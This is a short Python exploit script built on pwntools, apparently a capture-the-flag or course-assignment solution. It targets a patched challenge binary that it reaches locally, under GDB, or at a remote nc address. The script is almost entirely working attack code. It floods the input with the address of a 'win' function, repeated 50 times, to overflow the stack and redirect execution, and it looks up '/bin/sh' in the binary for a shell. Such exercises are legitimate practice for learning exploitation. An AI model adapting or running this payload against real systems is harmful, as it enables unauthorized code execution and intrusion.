#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./assgn1_2o3BvZ6_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc ec0e192.678470.xyz 31947"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    payload = p32(exe.sym.win)*50
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()